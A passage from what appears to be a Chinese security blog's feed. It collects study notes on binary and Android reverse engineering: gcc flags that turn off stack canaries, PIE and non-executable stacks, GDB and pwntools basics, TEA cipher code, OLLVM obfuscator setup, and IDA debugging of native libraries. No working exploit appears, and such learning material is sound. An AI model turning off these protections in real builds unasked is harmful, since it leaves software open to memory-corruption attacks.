&lt;td&gt;关掉Stack Protector/Canary（栈保护）&lt;/td&gt;
&lt;td&gt;gcc -fno-stack-protector -o level level.c&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
&lt;td&gt;关掉程序ASLR/PIE（程序随机化保护）&lt;/td&gt;
&lt;td&gt;gcc -no-pie level level.c&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
&lt;td&gt;64位linux下面的GCC编译出一个32位可执行程序&lt;/td&gt;
&lt;td&gt;gcc -m32 -z execstack -fno-stack-protector -o level level.c&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;gdb常用调试命令&#34;&gt;GDB常用调试命令&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-C&#34;&gt;gcc -g  main.c                      //在目标文件加入源代码的信息
gdb a.out       

(gdb) start                         //开始调试
(gdb) n                             //一条一条执行
(gdb) step/s                        //执行下一条，如果函数进入函数
(gdb) backtrace/bt                  //查看函数调用栈帧
(gdb) info/i locals                 //查看当前栈帧局部变量
(gdb) frame/f                       //选择栈帧，再查看局部变量
(gdb) print/p                       //打印变量的值
(gdb) finish                        //运行到当前函数返回
(gdb) set var sum=0                 //修改变量值
(gdb) list/l 行号或函数名             //列出源码
(gdb) display/undisplay sum         //每次停下显示变量的值/取消跟踪
(gdb) break/b  行号或函数名           //设置断点
(gdb) continue/c                    //连续运行
(gdb) info/i breakpoints            //查看已经设置的断点
(gdb) delete breakpoints 2          //删除某个断点
(gdb) disable/enable breakpoints 3  //禁用/启用某个断点
(gdb) break 9 if sum != 0           //满足条件才激活断点
(gdb) run/r                         //重新从程序开头连续执行
(gdb) watch input[4]                //设置观察点
(gdb) info/i watchpoints            //查看设置的观察点
(gdb) x/7b input                    //打印存储器内容，b--每个字节一组，7--7组
(gdb) disassemble                   //反汇编当前函数或指定函数
(gdb) si                            // 一条指令一条指令调试 而 s 是一行一行代码
(gdb) info registers                // 显示所有寄存器的当前值
(gdb) x/20 $esp                    //查看内存中开始的20个数
ni 单步执行不进入 
si 单步执行并进入
disas addr 对地址addr处的指令进行反汇编，addr可以是函数名 
checksec 查看elf编译的保护选项。 
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;查壳&#34;&gt;查壳&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;upx -d file&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;objjump&#34;&gt;objjump&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;objdump是二进制文件快速查看工具。   常用命令：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;objdump -d [file]&lt;/code&gt; 查看文件的所有汇编代码&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;objdump -f [file]&lt;/code&gt; 查看文件的每个文件的整体头部摘要&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;####python&lt;/p&gt;

&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;python -c &amp;quot;...&amp;quot; | ./file&lt;/code&gt; python以命令方式执行并把结果传递给file&lt;/li&gt;
&lt;li&gt;&lt;code&gt;python -c &amp;quot;...&amp;quot; | xargs ./file&lt;/code&gt; python以命令方式执行并当作命令行参数传递给file，具体的是：“它的作用是将参数列表转换成小块分段传递给其他命令，以避免参数列表过长的问题。”存在这个命令是因为很多的参数不支持以管道的方式传递。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;os.system()&lt;/code&gt; 创建一个子进程&lt;/li&gt;
&lt;li&gt;&lt;code&gt;os.putenv(&amp;quot;name&amp;quot;, &amp;quot;value&amp;quot;)&lt;/code&gt; 添加一个环境变量&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;pwntools&#34;&gt;pwntools&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;参考
&lt;a href=&#34;http://pwntools.readthedocs.io/en/stable/&#34;&gt;http://pwntools.readthedocs.io/en/stable/&lt;/a&gt;   （官网介绍）&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://brieflyx.me/2015/python-module/pwntools-intro/&#34;&gt;http://brieflyx.me/2015/python-module/pwntools-intro/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://brieflyx.me/2015/python-module/pwntools-advanced/&#34;&gt;http://brieflyx.me/2015/python-module/pwntools-advanced/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一般直接用from pwn import * 或者import pwn将所有模块导入到当前命名空间，这条语句还会把os、sys等常用的系统库一并导入。&lt;/p&gt;

&lt;p&gt;常用的模块有下面几个：
- ==asm==:汇编与反汇编
- ==dynelf==:用于远程符号泄露，需要提供leak方法
- ==elf==:对elf文件进行操作
- ==gdb==:配合gdb进行调试
- ==memleak==:用于内存泄漏
- ==shellcraft==: shellcode的生成器
- ==tubes==:包括tubes: 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE
- ==utils==:一些实用的小功能，例如CRC计算，cyclic pattern等&lt;/p&gt;
&lt;/blockquote&gt;
</description>
      
    </item>
    
    <item>
      <title>Android-ARM进阶</title>
      <link>https://naivete.cc/post/android-arm%E8%BF%9B%E9%98%B6/</link>
      <pubDate>Wed, 10 Oct 2018 16:40:20 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android-arm%E8%BF%9B%E9%98%B6/</guid>
      
        <description>

&lt;p&gt;学习一些关于ARM的汇编结构特点，以及分析。理解一些结构最好的方法就是多去尝试动手做。。&lt;/p&gt;

&lt;h3 id=&#34;ndk-build的使用&#34;&gt;NDK-Build的使用&lt;/h3&gt;

&lt;p&gt;可以参考&lt;a href=&#34;https://developer.android.com/ndk/guides/ndk-build?hl=zh-cn&#34;&gt;官方文档&lt;/a&gt;。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;创建一个Android项目&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;cd 项目目录&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;ndk&gt;/ndk-build   。也可以将NDK-build加入环境变量。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;创建jni文件夹，添加 Android.mk和 Application.mk两个文件。（参考官方文档）&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-mk&#34;&gt;   //Android.mk
   LOCAL_PATH := $(call my-dir)
   include $(CLEAR_VARS)
   
   # 要生成的.so库名称
   LOCAL_MODULE := hello
   # c++文件
   LOCAL_SRC_FILES := hello.cpp
   include $(BUILD_SHARED_LIBRARY)
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-mk&#34;&gt;   //Application.mk
   APP_PLATFORM := android-17
   # APP_ABI := all
   APP_ABI :=armeabi-v7a arm64-v8a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;添加hello.cpp：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;   #include&amp;lt;cstdio&amp;gt;
   int i,j;
   int num[] = {1,2,3,4,5};
   int main()
   {
       /* code */
       printf(&amp;quot;hello,world!\n&amp;quot;);
       for(i=0;i&amp;lt;5;i++){
           printf(&amp;quot;num value is %d\n&amp;quot;,num[i]);
       }
       return 0;
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ndk-build&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180814152220.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;push 到Android设备运行&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这里ARM32位出现里非法引用（Illegal instruction）。。之后再试试&lt;/p&gt;

&lt;p&gt;改成ARM64之后又出现内存区段错误“Segmentation fault”  有毒呀。。可能是哪里设置有问题。。&lt;/p&gt;

&lt;h3 id=&#34;arm-linux-gcc交叉编译器编译&#34;&gt;arm-linux-gcc交叉编译器编译&lt;/h3&gt;

&lt;p&gt;arm-linux-gcc也能编译出ARM可执行文件。&lt;code&gt;sudo apt install g++-arm-linux-gnueabihf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;或者下载&lt;a href=&#34;https://developer.arm.com/open-source/gnu-toolchain/gnu-rm/downloads&#34;&gt;二进制&lt;/a&gt;文件安装。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;arm-linux-gnueabihf-g++  -static  helloworld.cpp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;push进Android之后运行成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180814164353.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;使用这个方法和用NDK-build编译的有差异。&lt;/p&gt;

&lt;h3 id=&#34;for循环&#34;&gt;for循环&lt;/h3&gt;

&lt;p&gt;待添加&lt;/p&gt;

&lt;h3 id=&#34;if-else&#34;&gt;if-else&lt;/h3&gt;

&lt;p&gt;待添加&lt;/p&gt;

&lt;h3 id=&#34;while&#34;&gt;while&lt;/h3&gt;

&lt;h3 id=&#34;switch&#34;&gt;switch&lt;/h3&gt;

&lt;h3 id=&#34;优化&#34;&gt;优化&lt;/h3&gt;

&lt;p&gt;###C++&lt;/p&gt;

&lt;h3 id=&#34;jni-api分析&#34;&gt;JNI API分析&lt;/h3&gt;
</description>
      
    </item>
    
    <item>
      <title>TEA加密与解密</title>
      <link>https://naivete.cc/post/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</link>
      <pubDate>Tue, 11 Sep 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/tea%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/</guid>
      
        <description>

&lt;h2 id=&#34;tea加密与解密&#34;&gt;TEA加密与解密&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://baike.baidu.com/item/TEA%E7%AE%97%E6%B3%95/10167844&#34;&gt;TEA算法&lt;/a&gt;由&lt;a href=&#34;https://baike.baidu.com/item/%E5%89%91%E6%A1%A5%E5%A4%A7%E5%AD%A6/278542&#34;&gt;剑桥大学&lt;/a&gt;计算机实验室的David Wheeler和Roger Needham于1994年发明。它是一种分组&lt;a href=&#34;https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95&#34;&gt;密码算法&lt;/a&gt;，其明文密文块为64比特，&lt;a href=&#34;https://baike.baidu.com/item/%E5%AF%86%E9%92%A5&#34;&gt;密钥&lt;/a&gt;长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的&lt;a href=&#34;https://baike.baidu.com/item/%E8%BF%AD%E4%BB%A3&#34;&gt;迭代&lt;/a&gt;次数可以改变，建议的迭代次数为32轮。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在游戏项目中，一般需要对资源或数据进行加密保护，最简单高效的加密算法就是采用位与或之类的，但是比较容易被人分析出来。 TEA加密算法不但比较简单，而且有&lt;strong&gt;很强的抗差分分析能力&lt;/strong&gt;，&lt;strong&gt;加密速度也比较快&lt;/strong&gt;。可以根据项目需求设置加密轮数来增加加密强度。&lt;em&gt;主要运用了移位和异或运算。密钥在加密过程中始终不变。&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;差分分析是一种选择明文攻击，其基本思想是：通过分析特定明文差分对相对应密文差分影响来获得尽可能大的密钥。它可以用来攻击任何由迭代一个固定的轮函数的结构的密码以及很多分组密码（包括DES），它是由Biham和Shamir于1991年提出的选择明文攻击。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
&lt;li&gt;加密核心函数&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key)
{
    unsigned int y = *firstChunk;
    unsigned int z = *secondChunk;
    unsigned int sum = 0;

    unsigned int delta = 0x9e3779b9;

    for (int i = 0; i &amp;lt; 8; i++)  //8轮运算(需要对应下面的解密核心函数的轮数一样)
    {
        sum += delta;
        y += ((z &amp;lt;&amp;lt; 4) + key[0]) ^ (z + sum) ^ ((z &amp;gt;&amp;gt; 5) + key[1]);
        z += ((y &amp;lt;&amp;lt; 4) + key[2]) ^ (y + sum) ^ ((y &amp;gt;&amp;gt; 5) + key[3]);
    }

    *firstChunk = y;
    *secondChunk = z;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
&lt;p&gt;算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」&amp;ndash;&amp;gt;  delta = 0x9e3779b9;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
&lt;li&gt;解密核心函数&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;   void DecryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key)
   {
       unsigned int  sum = 0;
       unsigned int  y = *firstChunk;
       unsigned int  z = *secondChunk;
       unsigned int  delta = 0x9e3779b9;
   
       sum = delta &amp;lt;&amp;lt; 3; //32轮运算，所以是2的5次方；16轮运算，所以是2的4次方；8轮运算，所以是2的3次方
   
       for (int i = 0; i &amp;lt; 8; i++) //8轮运算
       {
           z -= (y &amp;lt;&amp;lt; 4) + key[2] ^ y + sum ^ (y &amp;gt;&amp;gt; 5) + key[3];
           y -= (z &amp;lt;&amp;lt; 4) + key[0] ^ z + sum ^ (z &amp;gt;&amp;gt; 5) + key[1];
           sum -= delta;
       }
   
       *firstChunk = y;
       *secondChunk = z;
   }
&lt;/code&gt;&lt;/pre&gt;
</description>
      
    </item>
    
    <item>
      <title>OLLVM 混淆之一</title>
      <link>https://naivete.cc/post/ollvm-%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80/</link>
      <pubDate>Mon, 10 Sep 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/ollvm-%E6%B7%B7%E6%B7%86%E4%B9%8B%E4%B8%80/</guid>
      
        <description>

&lt;h3 id=&#34;ollvm&#34;&gt;OLLVM&lt;/h3&gt;

&lt;p&gt;OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个针对LLVM代码混淆项目， 用于增加逆向难度，保护代码的安全。最新版本为&lt;a href=&#34;https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0&#34;&gt;4.0&lt;/a&gt;。OLLVM适用LLVM支持的所有语言（C, C++, Objective-C, Ada 和 Fortran）和目标平台（x86, x86-64, PowerPC, PowerPC-64, ARM, Thumb, SPARC, Alpha, CellSPU, MIPS, MSP430, SystemZ, 和 XCore）。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://llvm.org/&#34;&gt;LLVM&lt;/a&gt;是lowlevel virtual machine的简称，是一个编译器框架。详细介绍可以看&lt;a href=&#34;https://zh.wikipedia.org/wiki/LLVM&#34;&gt;WIKI-LLVM&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180823112535.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;经典的三段式设计，前端使用不同的编译工具对代码进行分析转换成LLVM的中间表示IR（intermediate representation）。中间部分优化器只对IR进行操作，通过一系列的Pass对IR做优化。后端主要是讲优化好的IR解释成对应的机器码。&lt;/p&gt;

&lt;p&gt;对IR的处理过程下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180823113111.png&#34; alt=&#34;IR Pass&#34; /&gt;&lt;/p&gt;

&lt;p&gt;OLLVM的混淆操作在IR层，通过编写Pass来混淆IR，以致后端生成的目标代码也被混淆了。&lt;/p&gt;

&lt;h3 id=&#34;ollvm-android环境搭建&#34;&gt;OLLVM-Android环境搭建&lt;/h3&gt;

&lt;p&gt;前提环境：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;NDK环境&lt;/li&gt;
&lt;li&gt;LLVM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下载源码(包括了LLVM和Clang)-编译OLLVM步骤如下：&lt;/p&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git
$ mkdir build
$ cd build
$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/
//（cmake -G &amp;quot;MinGW Makefiles&amp;quot; -DCMAKE_BUILD_TYPE=Release ../obfuscator/）(windows)
$ make -j7   //这个数字自己看自己CPU填 太小可能非常编译慢 
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;可以参照&lt;a href=&#34;https://github.com/obfuscator-llvm/obfuscator/wiki&#34;&gt;官方wiki&lt;/a&gt;来操作。编译完成后，二进制文件放在build/bin目录下。&lt;/p&gt;

&lt;p&gt;配置整合NDK：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;打开NDK目录ndk-bundle下的toolchains，新建obfuscator-llvm-4，将llvm文件夹里的所有文件复制到新建的目录下。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;将&lt;code&gt;\build\bin&lt;/code&gt;目录下的&lt;code&gt;clang.exe&lt;/code&gt;、&lt;code&gt;clang++.exe&lt;/code&gt;和&lt;code&gt;clang-format.exe&lt;/code&gt;复制到&lt;code&gt;\toolchains\llvm\prebuilt\windows-x86_64\bin&lt;/code&gt;目录下，直接替换掉其中的文件。（Windows下）&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;（linux下)将llvm目录下的prebuilt目录和文件 config.mk、setup.mk和setup-common.mk拷贝到创建的obfuscator-llvm目录下-&amp;gt;然后替换obfuscator-llvm/prebuilt/linux-x86下的bin和lib为我们编译好的bin和lib&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;然后将下面文件复制一份，改名称如下，比如arm-linux-androideabi-clang3.4复制一行改名为arm-linux-androideabi-obfuscator3.4&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;arm-linux-androideabi-clang3.4-&amp;gt; arm-linux-androideabi-obfuscator3.4&lt;/p&gt;

&lt;p&gt;mipsel-linux-android-clang3.4-&amp;gt; mipsel-linux-android-obfuscator3.4&lt;/p&gt;

&lt;p&gt;x86-clang3.4-&amp;gt; x86-obfuscator3.4&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;分别修改以上三个文件的 setup.mk 中的 LLVM_NAME ，即将其指定到开始建立的obfuscator-llvm-3.4目录，也就是把把&lt;code&gt;LLVM_NAME := llvm-$(LLVM_VERSION)改成LLVM_NAME := obfuscator-llvm-$(LLVM_VERSION)&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;如果是配置64位的ndk配置,还要额外修改$NDK_PATH/build/core/setup-toolchain.mk文件，在NDK_64BIT_TOOLCHAIN_LIST := 加入 obfuscator 对应的NDK_TOOLCHAIN_VERSION NDK_64BIT_TOOLCHAIN_LIST := obfuscator3.4 clang3.6 clang3.5 clang3.4 4.9&amp;rsquo;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;开始使用ollvm&#34;&gt;开始使用OLLVM&lt;/h3&gt;

&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.freebuf.com/articles/terminal/130142.html&#34;&gt;http://www.freebuf.com/articles/terminal/130142.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/&#34;&gt;https://geneblue.github.io/2016/10/09/%E5%88%A9%E7%94%A8OLLVM%E6%B7%B7%E6%B7%86Android%20Native%E4%BB%A3%E7%A0%81%E7%AF%87%E4%B8%80/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jmpoep.com/thread-4016-1-1.html&#34;&gt;https://www.jmpoep.com/thread-4016-1-1.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;BCTFhttp://ele7enxxh.com/Bctf-2016-LostFlower-Writeup.html&lt;/li&gt;
&lt;/ul&gt;
</description>
      
    </item>
    
    <item>
      <title>IDA 动态调试.so 基本步骤</title>
      <link>https://naivete.cc/post/ida-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so-%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</link>
      <pubDate>Fri, 31 Aug 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/ida-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95.so-%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4/</guid>
      
        <description>

&lt;h2 id=&#34;ida-动态调试-so-基本步骤&#34;&gt;IDA 动态调试.so 基本步骤&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;待补图&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;0x00-ida快捷键&#34;&gt;0x00 IDA快捷键&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Shirt+F12 字符串窗口&lt;/li&gt;
&lt;li&gt;F5大法好 反汇编&lt;/li&gt;
&lt;li&gt;Ctrl+S  查看so对应段的信息（非调试），快速定位so文件的内存地址（Debug）&lt;/li&gt;
&lt;li&gt;G 快速跳转到对应地址。s&lt;/li&gt;
&lt;li&gt;调试-F7单步进入调试、F8单步、F9运行&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;0x01-方法一&#34;&gt;0x01 方法一&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;获取运行Android_server。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;android_server文件放在IDA安装目录下的\dbgsrv目录下 注意版本的不同。&lt;/p&gt;

&lt;p&gt;之后只需 &lt;code&gt;push android_server /data/local/tmp/&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;之后&lt;code&gt;adb shell&lt;/code&gt;，&lt;code&gt;su&lt;/code&gt; ，&lt;code&gt;cd /data/local/tmp/&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;可能还得&lt;code&gt;chmod 755 android_server&lt;/code&gt; 才有权限运行。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;建立通信、attach进程。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;adb forward tcp:23946 tcp:23946&lt;/code&gt;命令。&lt;/p&gt;

&lt;p&gt;在IDA的Debugger选项中attach进程。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;加载so、找函数下断点&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;双开IDA ，Ctrl+S找到so文件的基地址，另外一个IDA找到函数的相对地址。相加得到绝对地址。&lt;/p&gt;

&lt;h4 id=&#34;0x02-方法二&#34;&gt;0x02 方法二&lt;/h4&gt;

&lt;p&gt;无法加载so文件需要在加载之前断点。反调试之类&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Debug方式启动app。需要应用可调试开启&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;adb shell am start -D -n 包名/.MainActivity&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;方法一的1，2两步 勾选选项。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;jdb attach程序&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;开始调试 同上

&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析-基础篇5-6</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/</link>
      <pubDate>Wed, 29 Aug 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%875-6/</guid>
      
        <description>

&lt;h2 id=&#34;一-基础篇⑤-⑥&#34;&gt;一、 基础篇⑤-⑥&lt;/h2&gt;

&lt;p&gt;这两章主要描述AndroidManifest.xml和resourec.arsc这两个android文件。内容不是很多，下面是两章的笔记。&lt;/p&gt;

&lt;h3 id=&#34;第五章-androidmanifest-xml格式解析&#34;&gt;第五章 AndroidManifest.xml格式解析&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829165213.png&#34; alt=&#34;AndroidManifest.xml&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;center&gt;AndroidManifest.xml文件格式图&lt;/center&gt;&lt;/p&gt;

&lt;h5 id=&#34;头部信息&#34;&gt;头部信息&lt;/h5&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;文件魔数：4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;文件大小：4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk内容 头部相同（ChunkType(4bytes)、ChunkSize(4bytes)）。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Sting Chunk&lt;/strong&gt; ：主要用于存放AndroidManifest.xml文件中所有的字符串信息。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ChunkType：类型，固定4bytes（0x001C001)。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ChunkSize：大小，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StringCount：字符串的个数 ，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StyleCount ：样式的个数，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Unknown ：位置区域。4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StringPoolOffset ：字符串池的偏移值。4bytes。偏移值相对于StringChunk头部的位置。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StylePoolOffset : 样式池的偏移值。4bytes。没有Style可忽略。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StringOffsets ：每一个字符串的偏移值，大小为StringChunk*4。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;StyleOffsets：每个样式的偏移值，大小为StyleChunk*4。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如何读取这个文件？&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Resourceld Chunk&lt;/strong&gt; ：主要用来存放AndroidManifest 中用到的系统属性值对应的资源ID&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ChunkType：类型，固定4bytes（0x00080108）。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ChunkSize：大小，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ResourceIds : 内容，大小为Resourceld Chunk大小除以4减去头部的8字节。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;解析？&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Start Namespace Chunk&lt;/strong&gt;：主要包含了AndroidMaifest文件中的命名空间的内容，android中的xml都是采用Schema格式（两种格式DTD和Schema）的，所有肯定有Prefix和URI。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk Type：类型，固定4bytes。（0x00100100)。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk Size：大小，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Line Number ：AndroidMaifest文件中行号，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Unknown：未知区域,4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Prefix：命名空间的前缀（在字符串中的索引值），eg:&lt;code&gt;android&lt;/code&gt;。&lt;/p&gt;&lt;/li&gt;

